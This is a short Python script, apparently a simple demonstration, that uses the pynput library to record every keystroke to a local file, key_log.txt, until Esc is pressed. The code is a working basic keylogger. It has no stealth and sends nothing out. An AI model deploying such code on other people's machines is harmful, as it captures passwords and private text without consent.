from pynput import keyboard

# Define the file where keystrokes will be saved
log_file = "key_log.txt"

# Function to handle writing keystrokes to the file
def write_to_file(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        if key == keyboard.Key.space:
            with open(log_file, "a") as file:
                file.write(" ")
        elif key == keyboard.Key.enter:
            with open(log_file, "a") as file:
                file.write("\n")
        else:
            with open(log_file, "a") as file:
                file.write(f" [{key}] ")

# Function to handle key press events
def on_press(key):
    write_to_file(key)

# Function to handle key release events
def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener

# Set up the listener for key press and release events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
